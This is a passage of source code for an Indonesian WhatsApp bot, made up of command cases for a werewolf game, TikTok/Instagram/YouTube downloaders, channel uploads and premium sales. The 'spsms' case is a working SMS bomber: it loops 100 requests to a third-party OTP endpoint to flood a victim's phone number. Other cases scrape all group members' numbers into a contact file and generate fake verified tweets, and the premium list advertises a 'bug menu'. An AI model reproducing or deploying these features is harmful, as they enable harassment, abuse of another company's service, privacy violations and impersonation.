        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        KhaerulZx.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
//==================================================================
case 'wwpc': {
if (banned.includes(m.sender)) {
return;
}
let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

    const {
        sender,
        chat
    } = m;
    KhaerulZx.werewolf = KhaerulZx.werewolf ? KhaerulZx.werewolf : {};
    const ww = KhaerulZx.werewolf ? KhaerulZx.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game");
    if (dataPlayer(sender, ww).status === true)
        return reply(
            "Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam"
        );
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati");
    if (!target || target.length < 1) return reply("Masukan nomor player");
    if (isNaN(target)) return reply("Gunakan hanya nomor");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return reply("Player sudah mati");
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri");
    if (byId === false) return reply("Player tidak terdaftar");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return reply("Peran ini bukan untuk kamu");
        if (byId.db.role === "sorcerer")
            return reply("Tidak bisa menggunakan skill untuk teman");
        return m
            .reply("Berhasil membunuh player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return reply("Peran ini bukan untuk kamu");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return reply("Peran ini bukan untuk kamu");
        return reply(`Berhasil melindungi player ${target}`)
        .then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return reply("Peran ini bukan untuk kamu");
        let sorker = sorcerer(sesi(m.sender), target);
        return m
            .reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}
break
//=============== F E A T U R E ======================//
case 'spsms': {
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return m.reply('*khusus Premium*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY HW MODS WA MODS`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
case 'savekontak': case 'svkontak':
if (banned.includes(m.sender)) {
return;
}
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply('Khusus Owner')
let cmiggc = await KhaerulZx.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
KhaerulZx.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'upch-audio':{
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return m.reply(mess.owner)
if (!/audio/.test(mime)) return m.reply(`Use ${prefix+command} Judul Lagu|Terserah\nExample ${prefix+command} Mungkin | Kita Sad Dulu`) 
 KhaerulZx.sendMessage(`${global.idsal}`, { react: { text: '🕐', key: m.key }})
 ngawi = text.split("|")[0]
 jomokck = text.split("|")[1]
 await sleep(6000)
KhaerulZx.sendMessage(m.chat,{audio: await quoted.download(),mimetype: 'audio/mp4',ptt: true,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: '120363247886007681@newsletter',
serverMessageId: 20,
newsletterName: '❃ FinsiiAi - Assistant'
}, externalAdReply: {
title: "ngawi", 
body: "jomokck",
thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg", 
sourceUrl: "https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV",
mediaType: 1
}, }}) 
//KhaerulZx.sendMessage(`${global.idch}`,{audio: await quoted.download(), mimetype: 'audio/mp4', ptt: true})
await sleep(2000)
KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break
/**
 * 
 * [ *CASE UPAUDIO* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'upaudio':{
if (!isCreator) return m.reply(mess.owner)
if (!/audio/.test(mime)) return m.reply(`khusus audio, .upaudio jidsaluran|request dari|judul lagu`)
    yaelahh = text.split("|")[0]
    ngawi = text.split("|")[1]
    bjirrwoila = text.split("|")[2]
 KhaerulZx.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
 await sleep(6000)
KhaerulZx.sendMessage(yaelahh, { 
  audio: await quoted.download(), 
viewOnce: false, 
seconds: "900000000", ptt: true, 
mimetype: "audio/mpeg", 
fileName: "bot.mp3", 
waveform: [0, 153, 0, 494, 976], 
contextInfo: {
forwardingScore: 999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: { 
newsletterName: '120363247886007681@newsletter', 
newsletterJid: 'Rul'
}, 
externalAdReply: { 
showAdAttribution: true, 
mediaType: 2, 
mediaUrl: `http://wa.me/62895392968503/${Math.floor(Math.random() * 100000000000000000)}`, 
title: `[🎶] - ${bjirrwoila}`, 
body: `Request by ${ngawi}`, 
sourceUrl: "", 
thumbnail: fs.readFileSync('./RulMedia/image/KhaerulZx.jpg')
}
}
})
await sleep(2000)
KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break
case 'upch-image':{
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return m.reply(mess.owner)
if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`\`\`\`🚩 Reply Image with ${prefix + command} Tulis Caption-nya\`\`\``)  
//tanaka sense 
  KhaerulZx.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
//tanaka sense   
 media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
//tanaka sense   
 let anu = await uploadToUguu(media)
//tanaka sense 
KhaerulZx.sendMessage(`${global.idsal}`, { 
    image: { 
        url: `${util.format(anu)}` 
    }, 
    caption: text,
    contextInfo: {
        forwardingScore: 9999, 
        isForwarded: true, 
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363247886007681@newsletter',
            serverMessageId: 20,
            newsletterName: '❃ FinsiiAi - Assistant'
        }, 
        externalAdReply: {
            title: "FinsiiAi", 
            body: "",
            thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg", 
            sourceUrl: "https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV",
            mediaType: 1
        }, 
    }
});
//tanaka sense 
await sleep(2000)
KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
//tanaka sense 
}
break
case'solver': {
	if (!text) return replyRix(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`) 
await KhaerulZx.sendMessage(m.chat, { react: { text: "🌚",key: m.key,}}) 
  if (/image/.test(mime)) {
    const media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
 	  let anuu = await pomfCDN(media)
    const data = await fetchJson(`https://widipe.com/bardimg?url=${anuu}&text=${encodeURIComponent(text)}`)
    const aimsg = data.result;
    m.reply(`${aimsg}`)
}
}
break
case"upchvip":{
if (!isCreator) return reply(mess.owner)
//if (!text) return m.reply("id ch nya mana om")
KhaerulZx.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
KhaerulZx.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
KhaerulZx.sendMessage(`${global.idsal}`, {audio: await quoted.download(),  mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363247886007681@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Finsii`,
newsletterJid: "120363247886007681@newsletter"}
}},{quoted: m})
await sleep(2000)
KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break
case 'ytvideo':
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await KhaerulZx.sendMessage(m.chat, {text: `_Searching.. [ ${text} ] 🔍_`}, {quoted: m, ephemeralExpiration: m.expiration})
let search = await yts(`${text}`)
const alicevidoh = require('./lib/ytdl3')
const vid=await alicevidoh.mp4(`${search.videos[0].url}`)
if (vid.videoUrl.fileSize > 10000) return reply(`Ukuran melebihi batas maksimal 50 MB`)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
var ppt = await prepareWAMessageMedia({ video: {url:vid.videoUrl}}, { upload: KhaerulZx.waUploadToServer })
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt.videoMessage, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
KhaerulZx.relayMessage(from, ptv.message, { messageId: ptv.key.id })
await KhaerulZx.sendMessage(m.chat,{
    text: ytc
})

await KhaerulZx.sendMessage(m.chat, {text: `_Mengirim.. [ ${text} ] 🔍_`, edit: wait.key }, {quoted: m, ephemeralExpiration: m.expiration});
  break
case "tiktok": case "tt": case "tiktokslide": case "ttslide": case "ttfoto": case "tiktokimg": case "tiktokfoto": {
    if (banned.includes(m.sender)) return;
    if (!text) return reply('linknya');
    if (!/tiktok.com/.test(text)) return reply("Link Tautan Tidak Valid!");
    
    reply(mess.wait);
    let tiktokUrl = text;
    
    await api.tiktok(tiktokUrl).then(async (res) => {
        var cap = `*SUKSES ✅*`;
        if (res.result.duration === 0) {
            if (res.result.images && res.result.images.length > 1) {
                let araara = [];
                let urutan = 0;

                for (let a of res.result.images) {
                    let imgsc = await prepareWAMessageMedia({ image: await fetch(`${a}`) }, { upload: KhaerulZx.waUploadToServer });
                    await araara.push({
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: `Foto Slide Ke *${urutan += 1}*`,
                            hasMediaAttachment: true,
                            ...imgsc
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [{
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a}\",\"merchant_url\":\"https://www.google.com\"}`
                            }]
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ-ᴀɪ`
                        })
                    });
                }

                const msgii = await generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.fromObject({
                                    text: "Berikut Adalah Foto Hasil Result Dari *Tiktok Slide* ⬇️"
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: araara
                                })
                            })
                        }
                    }
                }, { userJid: m.sender, quoted: m });

                await KhaerulZx.relayMessage(m.chat, msgii.message, {
                    messageId: msgii.key.id
                });
            } else if (res.result.images && res.result.images.length === 1) {
                await KhaerulZx.sendMessage(m.chat, { image: { url: res.result.images[0] }, caption: cap }, { quoted: m });
            }
        } else {
            if (res.result.play) {
                await KhaerulZx.sendMessage(m.chat, { video: { url: res.result.play }, caption: cap }, { quoted: m });
                
                let audioUrl = `https://widipe.com/download/ttdl?url=${text}`;
        
        // Mengirim audio sebagai Voice Note (PTT)
        await KhaerulZx.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
            }
        }
    }).catch(e => reply(`${e}`));
}
break;
case "instagram3": case "igdl3": case "ig3": {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`contoh ${command} link instagram`)
if (!text.includes("instagram.com")) return reply("Link tautan tidak valid!")
reply(mess.wait)
await api.igdl(`${text}`).then((res) => {
for (let a of res.result) {
KhaerulZx.sendMedia(m.chat, a.url, m, {
caption: "*Instagram Downloader ✅*"})
}
}).catch(e => reply(`${e}`))
}
break
case "tiktokmp3": case "ttaudio": case "ttmp3": case "tiktokaudio": {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`linknya?\n\ncontoh : ${prefix + command} https://vt.tiktok.com/xxxx`)
if (!text.includes("tiktok.com")) return reply("Link tautan tidak valid!")
reply(mess.wait)
await fetchJson(`https://widipe.com/download/ttdl?url=${text}`).then((res) => {
KhaerulZx.sendMessage(m.chat, {audio: {url: res.result.audio}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch(e => reply(`${e}`))
}
break
case 'tiktokslide2':
        case 'tiktokimg2': case 'tiktokfoto2':
        {
        if (banned.includes(m.sender)) {
return;
}
        if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
    if (!isRegistered) return reply('Kamu belum daftar !\nSilahkan daftar dengan cara .daftar')
        	if (!args[0]) return reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`)
KhaerulZx.sendMessage(m.chat, { react: { text: `🕐`, key: m.key }})
        let api = await fetch(`https://widipe.com/download/tiktokslide?url=${args[0]}`)
        let betaku = await api.json();
        for (let i of betaku.result.images) {
        KhaerulZx.sendMessage(m.chat, {
        image: {
        	url: i
        },
        caption: 'Done'
        }, {
        	quoted: m
        })
        }
        }
        break
/*case 'owner': {
let name = m.pushName || KhaerulZx.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *ʜᴀʟᴏ ᴋᴀᴋ \`${name}\`, sɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴀɴ ᴛᴏᴍʙᴏʟ ᴄʜᴀᴛ ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴜʙᴜɴɢɪ ᴏᴡɴᴇʀᴋᴜ*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = fs.readFileSync("./RulMedia/image/KhaerulZx.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: KhaerulZx.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './RulMedia/image/KhaerulZx.jpg' } }, { upload: KhaerulZx.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[OWNER BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${global.ownername} ]\`* ]==─
┆ • ᴊᴀɴɢᴀɴ sᴘᴀᴍ
┆ • sᴇʟʟ ᴘᴀɴᴇʟ ʙᴏᴛ
┆ • 
┆ • 
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"👤 ᴄʜᴀᴛ ᴏᴡɴᴇʀ ( ${global.ownername} )","url":"https://wa.me/${global.owner}","merchant_url":"https://wa.me/${global.owner}"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './RulMedia/image/KhaerulZx.jpg' } }, { upload: KhaerulZx.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[NOMOR BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${botname} ]\`* ]==─
┆• ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴏᴛ
┆• ᴅɪʟᴀʀᴀɴɢ ᴍᴇɴᴇʟᴘᴏɴ ʙᴏᴛ 
┆• ʙᴏᴛ ᴛɪᴅᴀᴋ ᴍᴇɴᴇʀɪᴍᴀ sᴠ ᴋᴏɴᴛᴀᴋ
┆• ɴᴏ 18+ 🔞
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"  💬 ᴄʜᴀᴛ ʙᴏᴛ ( ${botname} )","url":"https://wa.me/6282116397466?text=.menu","merchant_url":"https://wa.me/6282116397466?text=.menu"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break*/
/*
*CASE OWNER SIMPLE*
https://whatsapp.com/channel/0029VaWA5U1EQIamnmeXRn2M

Rulz

*/
case 'owner': {
    let name = m.pushName || KhaerulZx.getName(m.sender);
    let text = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *ʜᴀʟᴏ ᴋᴀᴋ \`${name}\`*
> *ɪɴɪ ᴀᴅᴀʟᴀʜ ᴏᴡɴᴇʀ sᴀʏᴀ:*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
    await KhaerulZx.sendMessage(m.chat, { text: text }, { quoted: m });
    const contacts = [
        {
            displayName: 'Owner Utama',
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Owner Utama\nTEL;type=CELL;waid=${global.owner}:${global.owner}\nEND:VCARD`
        },
        {
            displayName: 'Owner Kedua',
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Owner Kedua\nTEL;type=CELL;waid=${global.owner2}:${global.owner2}\nEND:VCARD`
        }
    ];
    await KhaerulZx.sendMessage(m.chat, { contacts: { displayName: 'Owner Bot', contacts } }, { quoted: m });
}
break;
case 'cekasalmember': {
if (banned.includes(m.sender)) {
return;
}
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
  if (!m.isGroup) return m.reply(mess.group)
  const participants = await KhaerulZx.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  participants.forEach(participant => {
const phoneNumber = participant.id.split('@')[0];
if (phoneNumber.startsWith("62")) {
  countIndonesia++;
} else if (phoneNumber.startsWith("60")) {
  countMalaysia++;
} else if (phoneNumber.startsWith("1")) {
  countUSA++;
} else if (phoneNumber.startsWith("+1")) {
  countOther++;
} else {
  countOther++;
}
  });
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  m.reply(replyMessage);
}
  break
  case 'prem': case 'buypremium':{
  teks28 = `[ Upgrade User Ke Premium User ]
*_Mengupdate User Menjadi Peremium_*

> PRICE LIST
- 1H - 2K
- 2H - 4K
- 5H - 5K
- 7H - 6K
- 10H - 10K
- 13H - 13K
- 16H - 15K
- 20H - 20K
- SEBULAN - 25K
- PERMANEN - 35K

> BENNEFITS
- UNLOCK OKEP MENU
- UNLOCK BUGMENU
- UNLOCK ADDSALDO
- INFINITY LIMITED
- SALDO INFINITY
- UNLOCK ALL FEATURE PREMIUM
- DLL

anyone like it? please upgrade Premium User to owner / KhaerulZx`
  KhaerulZx.sendMessage(from, { image: { url: "https://telegra.ph/file/7a8291ba6ea77b604e5aa.jpg" }, caption: teks28 }, { quoted: fcall })
}
  break
//wm sen
case 'faketweet':{
if (!text) return m.reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
  .setTheme("dim")
  .setUser({displayName: nama1, username: nama2})
  .setVerified(true)
  .setComment(katakata)
  .setAvatar(ppnyauser)
  .build();
 let tanaka = tweet
  KhaerulZx.sendMessage(m.chat, { image: tanaka, caption: 'Done Desuu~' },{ quoted : m })     
}
break
case 'bingai':{
if (!text) return m.reply("Ada yang bisa di bantu?")
//wm senn 
let message = await fetchJson(`https://widipe.com/bingai?text=${q}`)
 await KhaerulZx.sendMessage(m.chat, { react: { text: "🌟", key: m.key } }); 
//wm senn              
m.reply(message.result)
}
break
    case 'group': {
    if (banned.includes(m.sender)) {
return;
}
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!(isCreator || isAdmins)) return reply('Lah Dikira Admin Group Kali')
loading()
if (args[0] === 'close'){
await KhaerulZx.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await KhaerulZx.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "FInsii AI"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Klik tombol *open* untuk membuka group\nKlik tombol *close* untuk menutup group`),
                    subtitle: "© FInsii AI",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Open\",\"id\":\".group open\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Close\",\"id\":\".group close\"}"
},
 ],
 })
 })
 }
 }
}, {})

await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
}
break
// versi case


/*
*`SUMBER`*
https://whatsapp.com/channel/0029VagBdZ49MF92BygaM53t
* Fitur Di Buat Langsung Oleh Sell
*/
/*case 'ttsearch3': {
if (banned.includes(m.sender)) {
return;
}
if (!text) return reply(`*[ ! ]* *Perintah Di Hentikan*\n*Example ${prefix + command} Resah Jadi Luka*`) 
      if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Silahkan Hubungi Owner Untuk Membeli Limit')
             db.data.users[sender].limit -= 1 // -1 limit
                reply('1 Limit Anda Terpakai')
                     let res = await fetch(`https://widipe.com/tiktoksearch?text=${text}`)
    let spas = "              "
    let gfris = "`"
    let data = await res.json()
    let json = data.result
	let cap = `${spas}*${gfris}「 T I K T O K S E A R C H 」${gfris}*
*📷Desc:* ${json.title}\n\n${global.footer2}\n
*🎵Music:* ${json.cover}`
KhaerulZx.sendMessage(m.chat, { video: { url: json.no_watermark }, caption: `Video Nya,Untuk Yang Lain Silahkan Click Next` }, { quoted: m})

let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap, 
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname, 
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,         

          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({

            buttons: [{

            "name": "quick_reply",

              "buttonParamsJson": `{\"display_text\":\"Next🎥\",\"id\":\"${prefix + command} ${text}\"}`

            },{
            "name": "quick_reply", 
            "buttonParamsJson": `{\"display_text\":\"PoPular Search⭐\nPutar PoPuler Search Nya\",\"id\":\"${prefix + command} Resah Jadi Luka Song\"}`
             }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"AudioNya📌","url":"${json.music}","merchant_url":"${json.music}"}`   
                 }],

          }),

          contextInfo: {

                  mentionedJid: [m.sender], 

                  forwardingScore: 999,

                  isForwarded: true,

                forwardedNewsletterMessageInfo: {

                  newsletterJid: '120363247886007681@newsletter',

                  newsletterName: `Rᴇsᴜʟᴛ ғᴏʀᴍ ${text}`,

                  serverMessageId: 143

                }

                }

       })

    }

  }

}, { quoted: m })

return await KhaerulZx.relayMessage(m.chat, msgs.message, {}) 
} 
                break */
case 'yts': {
if (banned.includes(m.sender)) {
return;
}
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\n Hasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let caption = search.all.map((v, i) => {
        return {
            header: "",
            title: v.title,
            description: `[ ytmp3 ] Link: ${v.url}`,
            id: '.ytmp3 ' + v.url
        };
    });

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
